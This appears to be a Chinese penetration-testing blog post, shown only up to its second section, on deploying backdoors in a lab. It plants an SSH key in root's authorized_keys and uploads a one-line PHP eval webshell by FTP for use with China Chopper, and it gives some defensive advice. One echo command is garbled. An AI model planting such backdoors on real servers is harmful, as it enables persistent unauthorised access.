<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="远程控制和后门部署">
<meta property="og:url" content="https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/index.html">
<meta property="og:site_name" content="Ghost&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-10-17T03:32:17.000Z">
<meta property="article:modified_time" content="2023-12-23T13:46:38.740Z">
<meta property="article:author" content="Ghost">
<meta property="article:tag" content="远程控制">
<meta property="article:tag" content="后门">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/","path":"2022/10/17/远程控制和后门部署/","title":"远程控制和后门部署"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>远程控制和后门部署 | Ghost's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Ghost's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的SSH免认证后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的SSH免认证后门原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Linux系统的SSH免认证后门危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Linux系统的SSH免认证后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8puttygen%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="nav-text">1、利用PuttyGen生成密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BAauthorized_keys%E9%85%8D%E7%BD%AE%E5%85%AC%E9%92%A5"><span class="nav-text">2、目标机【authorized_keys】配置公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8putty%E8%BF%9B%E8%A1%8C%E5%85%8D%E8%AE%A4%E8%AF%81%E7%9A%84-ssh-%E7%99%BB%E5%BD%95%E6%B5%8B%E8%AF%95"><span class="nav-text">3、利用Putty进行免认证的
SSH 登录测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的PHP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-1"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的PHP
Webshell后门利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Linux系统的PHP
Webshell后门利用危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Linux系统的PHP
Webshell后门利用防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84web%E7%A8%8B%E5%BA%8F%E7%9B%AE%E5%BD%95%E4%B8%AD"><span class="nav-text">1、利用ftp服务器，上传小马文件到目标机的web程序目录中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E7%9A%84%E7%BD%91%E5%9D%80%E8%8F%9C%E5%88%80%E9%93%BE%E6%8E%A5%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF"><span class="nav-text">2、访问上传小马文件的网址，菜刀链接并获取相关有用信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%B0%8F%E9%A9%AC%E8%8E%B7%E5%8F%96%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%BF%91%E4%B8%80%E6%AD%A5%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text">3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Win系统的JSP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-2"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Win系统的JSP
Webshell后门危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Win系统的JSP
Webshell后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8tomcat%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E4%B8%8A%E4%BC%A0war%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6"><span class="nav-text">1、利用Tomcat文件管理上传war的木马文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E6%89%80%E5%85%B7%E5%A4%87%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%9B%B4%E8%87%B3%E6%8F%90%E6%9D%83"><span class="nav-text">2、利用木马文件所具备的功能进行信息获取直至提权</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ghost"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Ghost</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">142</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">68</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Ghost">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ghost's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="远程控制和后门部署 | Ghost's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          远程控制和后门部署
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-10-17 11:32:17" itemprop="dateCreated datePublished" datetime="2022-10-17T11:32:17+08:00">2022-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-12-23 21:46:38" itemprop="dateModified" datetime="2023-12-23T21:46:38+08:00">2023-12-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>4.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>15 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1
id="linux系统的ssh免认证后门"><strong>Linux系统的SSH免认证后门</strong></h1>
<h2 id="基本原理"><strong>1. 基本原理</strong></h2>
<h3
id="linux系统的ssh免认证后门原理"><strong>1、Linux系统的SSH免认证后门原理</strong></h3>
<p>免密码登录的原理就是在S一端存放那些有访问权限的C端的身份认证。即，在C端以ssh-gen命令生成一对公/私钥，私钥放在C端，公钥上传到S端。这样，每次从C登录S的时候，C端凭借着私钥让服务器端认证自己。这个密码只在C端把公钥上传到S端的时候用一次，后续登录即可免认证。</p>
<h3
id="linux系统的ssh免认证后门危害"><strong>2、Linux系统的SSH免认证后门危害</strong></h3>
<p>利用SSH免认证后门就可以不输入任何用户名和密码的信息，从而实现了免认证的
SSH。即使管理员日后修改了密码，也能够随时登录获取 root 用户权限。</p>
<h3
id="linux系统的ssh免认证后门防范"><strong>3、Linux系统的SSH免认证后门防范</strong></h3>
<ul>
<li>重装openssh软件，更新至最新版本</li>
<li>更换ssh默认端口</li>
<li>在iptable中添加ssh访问策略</li>
<li>查看命令历史纪录，对可疑文件进行清理。在有条件的情况下，可重做系统</li>
<li>修改服务器所有用户的密码为新的强壮密码。</li>
</ul>
<h2 id="实验环境"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：Putty</li>
</ul>
<p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件。较早的版本仅支持Windows平台，在最近的版本中开始支持各类Unix平台，并打算移植至Mac
OS
X上。除了官方版本外，有许多第三方的团体或个人将PuTTY移植到其他平台上，像是以Symbian为基础的移动电话。PuTTY为一开放源代码软件，主要由Simon
Tatham维护，使用MIT
licence授权。随着Linux在服务器端应用的普及，Linux系统管理越来越依赖于远程。在各种远程登录工具中，Putty是出色的工具之一。Putty是一个免费的、Windows
x86平台下的Telnet、SSH和rlogin客户端，但是功能丝毫不逊色于商业的Telnet类工具。</p>
<h2 id="实验过程"><strong>3. 实验过程</strong></h2>
<h3
id="利用puttygen生成密钥"><strong>1、利用PuttyGen生成密钥</strong></h3>
<p>点击“Genterate”按钮来生成一对非对称的公私密钥。在生成密钥的时候，需要等待一段时间，不过可以在空白处随意快速移动鼠标来加快生成速度。默认采用“SSH-2
RSA”算法以及“2048bit”密钥长度，一般无需改动。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc80aad371.png" /></p>
<ul>
<li><strong>结果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc847e2aed.png" /></p>
<ul>
<li><strong>点击“Save private key”按钮来保存私钥</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc8a2b6445.png" /></p>
<ul>
<li><strong>将公钥字符串复制出来，也单独保存个文本文件【后续要用】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc97b67843.png" /></p>
<h3
id="目标机authorized_keys配置公钥"><strong>2、目标机【authorized_keys】配置公钥</strong></h3>
<ul>
<li><strong>利用Putty工具，登录到目标机中，并将创建的公钥字符串追加添加到“/root/.ssh/authorized_keys”文件中去</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc9e49028a.png" /></p>
<ul>
<li><strong>确认系统中是否已经存在“/root/.ssh/authorized_keys”这个文件以及“/root/.ssh/”这个隐藏目录。</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -ad /root/.ssh</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">*   **如果系统默认不存在该目录和文件，先运行以下命令来创建目录和文件**。</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca6e2e2a1.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">touch</span> /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -al /root/.ssh/authorized_keys</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca8c7f67a.png)</span><br><span class="line"></span><br><span class="line">*   **运行以下命令来将刚才创建的公钥字符串追加添加到“/root/.ssh/authorized\_keys”文件中。**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB…………………………O3I0Q== rsa-key-20221017&quot;</span> &gt;&gt; /root/.ssh/authorized_keys<span class="string">&quot; &gt;&gt; /root/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用以下命令查看文件内容，确认是否正确：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccb7a14bb1.png" /></p>
<ul>
<li><strong>退出 Putty 的本次 SSH 会话。</strong></li>
</ul>
<h3
id="利用putty进行免认证的-ssh-登录测试"><strong>3、利用Putty进行免认证的
SSH 登录测试</strong></h3>
<ul>
<li><strong>先进行以下图片所示的基本配置</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc14463a2.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc265cbfc.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc44a43c9.png" /></p>
<ul>
<li><strong>结果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc529a9f7.png" /></p>
<h1
id="linux系统的php-webshell后门"><strong>Linux系统的PHP-Webshell后门</strong></h1>
<h2 id="基本原理-1"><strong>1. 基本原理</strong></h2>
<h3 id="linux系统的php-webshell后门利用原理"><strong>1、Linux系统的PHP
Webshell后门利用原理</strong></h3>
<p>利用ftp上传小马文件，通过菜刀链接，得到文件管理权限，上传大马文件后，提权就可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。导致该漏洞的原因在于代码作者没有对一些共享服务进行有效的管理，可以直接上传危害文件，从而导致主机被攻陷。</p>
<h3 id="linux系统的php-webshell后门利用危害"><strong>2、Linux系统的PHP
Webshell后门利用危害</strong></h3>
<p>拿到了网站的WebShell，就可以修改网站的文件了！这样，网站将不再有秘密可言，比如下载文件，修改文件，删除文件等，将变得非常容易。拿到WebShell权限后，如果磁盘做了安全设置以及站点独立权限设置，则这个WebShell可能只能对当前站点有效，无法操作其他网站的程序。如果入侵者通过执行命令，提升网站的权限后，就可以发展到入侵服务器，进而创建管理用户，达到控制整台服务器的目的。</p>
<h3 id="linux系统的php-webshell后门利用防范"><strong>3、Linux系统的PHP
Webshell后门利用防范</strong></h3>
<p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
　　然后，将系统设置安全，以及锁定用户组防止提权，防止3389远程登录，设置好ftp服务器，防止攻击者直接使用ftp上传木马程序文件到web程序的目录中，将可以极大提高服务器和网站的安全性。</p>
<h2 id="实验环境-1"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：中国菜刀（Chopper）</li>
</ul>
<p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p>
<h2 id="实验过程-1"><strong>3. 实验过程</strong></h2>
<h3
id="利用ftp服务器上传小马文件到目标机的web程序目录中"><strong>1、利用ftp服务器，上传小马文件到目标机的web程序目录中</strong></h3>
<p>在操作机上当前chopper目录中新建一个名为“test.php”的文件，文件内容为一句话的
PHP Webshell，即：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1234&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将一句话 PHP Webshell 上传到目标 Web 服务器的 Web
主目录中。在cmd界面以ftp登录目标机，如果成功登录的话，应该能够看到提示消息：“230
Login
successful.”。然后我们可以输入“<code>pwd</code>”命令显示当前所在的目录，我们尝试是否可以进入的
FTP 的父目录中，输入“<code>cd ..</code>”ftp
命令可以进入到父目录中；输入“<code>cd /</code>”ftp
命令可以进入到根目录中。这里我们输入“<code>cd /var/www</code>”命令，则可以进入到服务器的
Web 根目录中，然后运行“<code>dir</code>”命令来查看 Web
根目录中所有的子目录和文件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d42fc30589.png" /></p>
<p>将test.php复制到C盘根目录下，方便上传。使用如下 ftp
指令切换客户端本地目录到“C:\”目录中，然后上传“test.php”文件到目标服务器的
Web 根目录中去</p>
